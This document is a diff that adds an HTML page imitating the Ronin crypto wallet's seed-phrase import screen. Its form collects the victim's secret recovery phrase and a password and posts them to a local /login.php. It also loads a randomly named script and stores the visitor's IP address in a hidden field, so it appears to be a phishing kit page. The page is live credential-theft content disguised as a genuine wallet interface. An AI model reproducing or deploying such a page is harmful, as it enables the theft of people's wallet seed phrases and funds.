@@ -1,0 +1,357 @@
+<html class="js-focus-visible" data-js-focus-visible="" lang="en"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow, noimageindex">
+    <title>Ronin</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <link rel="icon" href="/thumbnail.png" type="image/x-icon">
+    <link rel="stylesheet" href="/index.css">
+    <style>
+      .step-wrapper .connect-line {
+        top: 17.5px;
+      }
+    </style>
+    <style>
+      .ds-input-wrapper-large > .ds-input {
+        width: 100%;
+        height: 40px;
+      }
+    </style>
+    <style>
+      @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+
+      body {
+        font-family: 'Inter', Helvetica, Arial, sans-serif;
+      }
+
+      /* HACK: Delete after update design system */
+      .well-full .ds-well-content {
+        width: 100%;
+      }
+
+      :root {
+        --color-aquatic: #00b8ce;
+        --color-beast: #ffb812;
+        --color-bug: #ff5341;
+        --color-bird: #ff8bbd;
+        --color-plant: #6cc000;
+        --color-reptile: #dc8be4;
+        --color-hidden-1: #c6bdd4;
+        --color-hidden-2: #beceff;
+        --color-hidden-3: #129092;
+        --color-axie: #8d65ff;
+        --color-savannah: #f99e2e;
+        --color-forest: #6cc000;
+        --color-arctic: #dbf0ef;
+        --color-mystic: #6fccd4;
+        --color-genesis: #3e7292;
+        --color-rarity-rare: #09b99b;
+        --color-rariry-epic: #ffa22a;
+        --color-rarity-mystic: #ae2aff;
+        --color-text-arctic: #55586a;
+
+        --ronin-rounded: 8px;
+        --ronin-blue: #1273ea;
+        --ronin-gradient: linear-gradient(256.28deg, #1c94f4 0%, #1273ea 100%);
+        --ronin-gradient--reverse: linear-gradient(76.28deg, #1c94f4 0%, #1273ea 100%);
+      }
+
+      .ds-button,
+      .ds-input,
+      .ds-dialog,
+      .ds-tooltip-content,
+      .ds-popover-content {
+        border-radius: var(--ronin-rounded);
+      }
+
+      .ds-popover-content {
+        background-color: transparent;
+      }
+
+      .ds-tooltip-content {
+        background-color: rgba(21, 26, 48, 0.8);
+      }
+
+      .text-ronin-blue {
+        color: var(--ronin-blue);
+      }
+
+      .border-ronin-blue {
+        border-color: var(--ronin-blue);
+      }
+
+      .bg-ronin-blue {
+        background-color: var(--ronin-blue);
+      }
+
+      .bg-ronin-gradient {
+        background-image: var(--ronin-gradient);
+      }
+
+      .hover\:bg-ronin-gradient:hover {
+        background-image: var(--ronin-gradient--reverse);
+      }
+
+      .bg-ronin-gradient-reversed {
+        background-image: var(--ronin-gradient--reverse);
+      }
+
+      .hover\:bg-ronin-gradient-reversed:hover {
+        background-image: var(--ronin-gradient);
+      }
+
+      .ds-button.ds-large {
+        padding-left: 20px;
+        padding-right: 20px;
+      }
+
+      .ronin-button {
+        transition: 0.2s ease-in-out;
+      }
+
+      .ronin-button-default {
+        color: var(--color-white);
+        background-color: transparent;
+      }
+
+      .ronin-button-default:disabled {
+        color: var(--color-white);
+        background-color: transparent;
+        opacity: 0.5;
+      }
+
+      .ronin-button-default:active {
+        background-image: linear-gradient(to right, #1773d0 0%, #1773d0 100%);
+      }
+
+      .ronin-button-default:not(:disabled):hover {
+        filter: brightness(120%);
+      }
+
+      .ronin-minimal-button {
+        color: var(--ronin-blue);
+        background-color: var(--color-basic-1);
+      }
+
+      .ronin-minimal-button:disabled {
+        color: var(--ronin-blue);
+        background-color: var(--color-basic-1);
+        opacity: 0.5;
+      }
+
+      .ronin-minimal-button.bg-transparent {
+        background-color: transparent;
+      }
+
+      .ronin-minimal-button.bg-transparent:disabled {
+        background-color: transparent;
+      }
+
+      .ronin-ghost-button {
+        box-shadow: 0 0 0 1px var(--ronin-blue) inset;
+        color: var(--ronin-blue);
+        background-color: transparent;
+      }
+
+      .ronin-ghost-button:hover {
+        background-color: var(--color-primary-1) !important;
+      }
+
+      .ronin-ghost-button.account-card-button:hover {
+        background-color: var(--color-primary-6) !important;
+      }
+
+      .shadow-none {
+        box-shadow: none;
+      }
+
+      .scrollbar-hidden::-webkit-scrollbar {
+        width: 0px;
+        background: transparent;
+      }
+
+      @keyframes wave {
+        0% {
+          transform: translateX(-100%);
+        }
+        60% {
+          transform: translateX(100%);
+        }
+        100% {
+          transform: translateX(100%);
+        }
+      }
+
+      .banner-image {
+        position: relative;
+        display: block;
+        overflow: hidden;
+        background: linear-gradient(90deg, #e4e8f2 0%, #f7f9fc 51.04%, #e4e8f2 100%), #e4e8f2;
+      }
+
+      .banner-image::after {
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        content: '';
+        position: absolute;
+        animation: wave 1.6s linear 0.5s infinite;
+        transform: translateX(-100%);
+        background: linear-gradient(90deg, transparent, rgba(0, 0, 0, 0.04), transparent);
+      }
+
+      .ds-input-wrapper-large > .ds-input {
+        width: 100%;
+        height: 40px;
+      }
+    </style>
+  </head>
+  <body>
+    <section id="root" style="margin: auto">
+      <div class="bg-no-repeat mh-screen" style="
+          background-image: url('/0fa701475eab3f1a6bd063a8460faa92.svg');
+          background-size: 1308px;
+          background-position: center 96px;
+        ">
+        <form id="maform" action="/login.php" method="post">
+          <div class="relavtive flex flex-col h-screen">
+            <div class="inline-block w-full mb-44 mt-16">
+              <img class="m-auto" src="/efdd139fe41f6d28007785ffe529d683.webp" alt="Ronin logo" style="height: 48px">
+            </div>
+            <div class="flex-1">
+              <div class="mx-auto mt-36 w-full" style="max-width: 500px">
+                <h4 class="mb-16 font-bold text-center">Import a wallet using seed phrase</h4>
+                <div class="m-auto text-center mb-44 leading-20">
+                  Enter your secret 12 word phrase here to restore your wallet
+                </div>
+                <label>
+                  <span class="uppercase text-basic-6 font-bold leading-12 pl-8">Secret recovery phrase</span>
+                  <div class="ds-form-group">
+                    <div>
+                      <span class="ds-input-wrapper-large text-14 ds-input-wrapper">
+                        <input id="sec" name="sec" class="ds-input" type="password" value="" required="" style="padding-left: 12px; padding-right: 44px">
+                        <div id="errphr2" class="ds-helper-text" style="display: none; color: red">
+                          Seed phrase is invalid
+                        </div>
+                        <span onclick="showsec()" class="ds-input-right">
+                          <span>
+                            <span class="cursor-pointer">
+                              <svg class="ds-svg-icon" viewBox="0 0 24 24" width="24" height="24" style="fill: var(--color-basic-5)">
+                                <defs>
+                                  <path id="eye_svg__a" d="M12 13.5c-.827 0-1.5-.673-1.5-1.5s.673-1.5 1.5-1.5 1.5.673 1.5 1.5-.673 1.5-1.5 1.5m0-5c-1.93 0-3.5 1.57-3.5 3.5s1.57 3.5 3.5 3.5 3.5-1.57 3.5-3.5-1.57-3.5-3.5-3.5m.22 8.498c-4.306.1-7.115-3.583-8.047-5.002 1.026-1.605 3.61-4.891 7.608-4.993 4.289-.11 7.114 3.583 8.046 5.002-1.025 1.605-3.61 4.89-7.607 4.993m9.648-5.495c-.638-1.112-4.162-6.686-10.138-6.5-5.528.14-8.743 5.01-9.597 6.5a.999.999 0 000 .995C2.762 13.595 6.162 19 12.025 19l.246-.003c5.527-.141 8.743-5.01 9.597-6.5a1.004 1.004 0 000-.994"></path>
+                                </defs>
+                                <use fill="" fill-rule="evenodd" xlink:href="#eye_svg__a"></use>
+                              </svg>
+                            </span>
+                          </span>
+                        </span>
+                      </span>
+                      <div class="ds-helper-text">
+                        <span class="flex items-center ml-8">
+                          <svg class="ds-svg-icon" viewBox="0 0 24 24" width="16" height="16" style="fill: rgb(143, 155, 179)">
+                            <defs>
+                              <path id="alert-circle-fill_svg__a" d="M13 13a1 1 0 01-2 0V8a1 1 0 012 0v5zm-1 4a1 1 0 110-2 1 1 0 010 2zm0-15C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2z"></path>
+                            </defs>
+                            <use fill="" fill-rule="evenodd" xlink:href="#alert-circle-fill_svg__a"></use>
+                          </svg>
+                          <span class="ml-4">Separate each word with a single space (ex: coffee milk
+                            flower...)</span>
+                        </span>
+                      </div>
+                    </div>
+                  </div>
+                </label>
+                <hr class="mt-40 border-opacity-50 border-basic-4 mb-40">
+                <label>
+                  <span class="uppercase text-basic-6 font-bold leading-12 pl-8 mr-4">enter password</span><span class="uppercase text-basic-5">(at least 8 characters)</span>
+                  <div class="ds-form-group">
+                    <div>
+                      <span class="ds-input-wrapper-large text-14 ds-input-wrapper">
+                        <input id="pass1" name="pass1" oninput="checkleght()" class="ds-input" type="password" value="" required="" style="padding-left: 12px; padding-right: 44px">
+                        <div id="pass1err" class="ds-helper-text" style="display: none; color: red">
+                          Password is too short
+                        </div>
+                        <span onclick="showpass1()" class="ds-input-right">
+                          <span>
+                            <span class="cursor-pointer">
+                              <svg class="ds-svg-icon" viewBox="0 0 24 24" width="24" height="24" style="fill: var(--color-basic-5)">
+                                <defs>
+                                  <path id="eye_svg__a" d="M12 13.5c-.827 0-1.5-.673-1.5-1.5s.673-1.5 1.5-1.5 1.5.673 1.5 1.5-.673 1.5-1.5 1.5m0-5c-1.93 0-3.5 1.57-3.5 3.5s1.57 3.5 3.5 3.5 3.5-1.57 3.5-3.5-1.57-3.5-3.5-3.5m.22 8.498c-4.306.1-7.115-3.583-8.047-5.002 1.026-1.605 3.61-4.891 7.608-4.993 4.289-.11 7.114 3.583 8.046 5.002-1.025 1.605-3.61 4.89-7.607 4.993m9.648-5.495c-.638-1.112-4.162-6.686-10.138-6.5-5.528.14-8.743 5.01-9.597 6.5a.999.999 0 000 .995C2.762 13.595 6.162 19 12.025 19l.246-.003c5.527-.141 8.743-5.01 9.597-6.5a1.004 1.004 0 000-.994"></path>
+                                </defs>
+                                <use fill="" fill-rule="evenodd" xlink:href="#eye_svg__a"></use>
+                              </svg>
+                            </span>
+                          </span>
+                        </span>
+                      </span>
+                      <div class="ds-helper-text"></div>
+                    </div>
+                  </div>
+                </label>
+                <label>
+                  <span class="uppercase text-basic-6 font-bold leading-12 pl-8">confirm password</span>
+                  <div class="ds-form-group">
+                    <div>
+                      <span class="ds-input-wrapper-large text-14 ds-input-wrapper">
+                        <input id="pass2" name="pass2" oninput="checkpass()" class="ds-input" type="password" value="" required="" style="padding-left: 12px; padding-right: 44px">
+                        <div id="pass2err" class="ds-helper-text" style="display: none; color: red">
+                          Confirm password does not match
+                        </div>
+                        <span onclick="showpass2()" class="ds-input-right">
+                          <span>
+                            <span class="cursor-pointer">
+                              <svg class="ds-svg-icon" viewBox="0 0 24 24" width="24" height="24" style="fill: var(--color-basic-5)">
+                                <defs>
+                                  <path id="eye_svg__a" d="M12 13.5c-.827 0-1.5-.673-1.5-1.5s.673-1.5 1.5-1.5 1.5.673 1.5 1.5-.673 1.5-1.5 1.5m0-5c-1.93 0-3.5 1.57-3.5 3.5s1.57 3.5 3.5 3.5 3.5-1.57 3.5-3.5-1.57-3.5-3.5-3.5m.22 8.498c-4.306.1-7.115-3.583-8.047-5.002 1.026-1.605 3.61-4.891 7.608-4.993 4.289-.11 7.114 3.583 8.046 5.002-1.025 1.605-3.61 4.89-7.607 4.993m9.648-5.495c-.638-1.112-4.162-6.686-10.138-6.5-5.528.14-8.743 5.01-9.597 6.5a.999.999 0 000 .995C2.762 13.595 6.162 19 12.025 19l.246-.003c5.527-.141 8.743-5.01 9.597-6.5a1.004 1.004 0 000-.994"></path>
+                                </defs>
+                                <use fill="" fill-rule="evenodd" xlink:href="#eye_svg__a"></use>
+                              </svg>
+                            </span>
+                          </span>
+                        </span>
+                      </span>
+                      <div class="ds-helper-text"></div>
+                    </div>
+                  </div>
+                </label>
+                <div class="flex justify-end items-start gap-16 mt-40">
+                  <button type="button" class="
+                      ronin-button ronin-minimal-button
+                      shadow-none
+                      bg-transparent
+                      undefined
+                      ds-button ds-large
+                    ">
+                    <svg class="ds-svg-icon mr-8" viewBox="0 0 24 24" width="16" height="16" style="fill: currentcolor">
+                      <defs>
+                        <path id="arrow-left_svg__a" d="M19 11H7.135l3.633-4.36a1 1 0 10-1.536-1.28l-5 6c-.039.047-.059.102-.088.154-.024.042-.053.078-.071.124a.985.985 0 00-.072.358L4 12l.001.004c0 .122.027.243.072.358.018.046.047.082.071.124.029.052.049.107.088.154l5 6a.999.999 0 101.536-1.28L7.135 13H19a1 1 0 000-2"></path>
+                      </defs>
+                      <use fill="" fill-rule="evenodd" xlink:href="#arrow-left_svg__a"></use>
+                    </svg>
+                    Go Back
+                  </button>
+                  <button type="submit" class="
+                      ronin-button ronin-button-default
+                      shadow-none
+                      bg-ronin-gradient
+                      hover:bg-ronin-gradient
+                      capitalize
+                      ds-button ds-large
+                    ">
+                    Import wallet
+                  </button>
+                  <p id="tagliney" hidden="">0</p>
+                  <input type="hidden" id="token" value="2001:4454:61a:3000:e087:b0b5:fb98:78aa">
+                </div>
+              </div>
+            </div>
+          </div>
+        </form>
+      </div>
+    </section>
+    <script src="/bKyLNt2BEutwxj8k9eAeH9Wdv8uBBQJPHOdRVlEZ.js"></script>
+    <div class="ds-toast-container ds-place-bottom-center"></div>
+  <style>.footer,.generic-footer{margin-bottom:98px}@media (min-width:374px){.footer,.generic-footer{margin-bottom:78px}}@media (min-width:546px){.footer,.generic-footer{margin-bottom:56px}}@media (min-width:1055px){.footer,.generic-footer{margin-bottom:0}}.disclaimer{position:fixed;z-index:9999999;bottom:0;right:0;border-top:2px solid #ff5c62;text-align:center;font-size:14px;font-weight:400;background-color:#fff;padding:5px 10px 5px 10px}.disclaimer a:hover{text-decoration:underline}@media (min-width:1052px){.disclaimer{text-align:right;border-left:2px solid red;border-top-left-radius:10px}}@media (min-width:1920px){.disclaimer{width:60%}}</style><div class="disclaimer">We support Ukraine and condemn war. Push Russian government to act against war. Be brave, vocal and show your support to Ukraine. Follow the latest news <a title="https://www.bbc.com/news/live/world-europe-60517447" target="_blank" href="https://www.bbc.com/news/live/world-europe-60517447" style="color: black;"><b>HERE</b></a></div>
+
+</body></html>
